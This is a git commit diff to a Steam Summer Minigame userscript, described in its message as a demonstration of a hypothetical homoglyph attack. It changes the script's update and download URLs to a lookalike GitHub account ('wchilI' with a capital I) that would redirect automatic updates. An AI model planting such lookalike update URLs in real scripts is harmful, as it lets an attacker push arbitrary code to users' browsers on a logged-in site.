25f51d859852db972986aad4f17f2de889483662
wchili <gitwchili@gmail.com>
2015-06-19 08:25:22 -0700

    Update autoPlay.user.js
    This demonstrates a hypothetical homoglyph attack.

--- autoPlay.user.js
+++ autoPlay.user.js
@@ -6,8 +6,8 @@
 // @match *://steamcommunity.com/minigame/towerattack*
 // @match *://steamcommunity.com//minigame/towerattack*
 // @grant none
-// @updateURL https://raw.githubusercontent.com/wchill/steamSummerMinigame/master/autoPlay.user.js
-// @downloadURL https://raw.githubusercontent.com/wchill/steamSummerMinigame/master/autoPlay.user.js
+// @updateURL HTTPS://raw.githubusercontent.com/wchilI/steamSummerMinigame/master/autoPlay.user.js
+// @downloadURL HTTPS://raw.githubusercontent.com/wchilI/steamSummerMinigame/master/autoPlay.user.js
 // ==/UserScript==
 
 // IMPORTANT: Update the @version property above to a higher number such as 1.1 and 1.2 when you update the script! Otherwise, Tamper / Greasemonkey users will not update automatically.
